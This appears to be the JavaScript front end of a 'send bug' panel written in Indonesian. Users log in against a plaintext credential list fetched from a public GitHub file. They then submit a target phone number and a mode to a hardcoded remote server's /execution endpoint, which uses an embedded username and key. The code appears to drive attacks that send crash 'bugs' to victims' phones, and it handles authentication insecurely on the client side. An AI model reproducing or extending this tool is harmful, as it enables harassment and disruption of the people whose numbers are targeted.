let currentUser = null;
let selectedMode = null;

async function login() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const loginError = document.getElementById("loginError");

  try {
    const res = await fetch('https://raw.githubusercontent.com/Vepgelo/Rowr/main/VALO.txt');
    const text = await res.text();
    const users = text.trim().split("\n").map(line => {
      const [username, password] = line.split("|");
      return { username, password };
    });

    const valid = users.find(u => u.username === user && u.password === pass);

    if (valid) {
      currentUser = user;
      document.getElementById("loginBox").style.display = "none";
      document.getElementById("dashboard").style.display = "block";
      document.getElementById("userInfo").innerText = `🟢 ${user} (Login)`;
      loginError.style.color = "white";
      loginError.innerText = "✅ Login berhasil!";
    } else {
      loginError.style.color = "red";
      loginError.innerText = "❌ Username atau password salah!";
    }
  } catch (err) {
    console.error("Gagal ambil data login:", err);
    loginError.style.color = "red";
    loginError.innerText = "❌ Gagal mengambil data dari server!";
  }
}

function showTargetForm(mode) {
  selectedMode = mode;
  document.getElementById("targetForm").style.display = "block";
  document.getElementById("resultMessage").innerText = "";
}

function sendBug() {
  const number = document.getElementById("targetInput").value.trim();
  const username = "Vep123";
  const key = "XRKN";
  const messageBox = document.getElementById("resultMessage");

  if (!number || !/^\d{10,15}$/.test(number)) {
    messageBox.innerText = "⚠️ Nomor tidak valid!";
    messageBox.style.color = "red";
    return;
  }

  const url = `http://139.59.72.62:1900/execution?target=${number}&mode=${selectedMode}&username=${username}&key=${key}`;

  axios.get(url)
    .then(response => {
      const data = response.data;
      if (data.error) {
        messageBox.innerText = "❌ Send bug gagal: " + data.error;
        messageBox.style.color = "red";
      } else {
        messageBox.innerText = data.message || "✅ Bug berhasil dikirim!";
        messageBox.style.color = "green";
      }
    })
    .catch(err => {
      messageBox.innerText = "❌ Send bug gagal: " + (err.message || "Tidak terhubung ke server");
      messageBox.style.color = "red";
    });
}
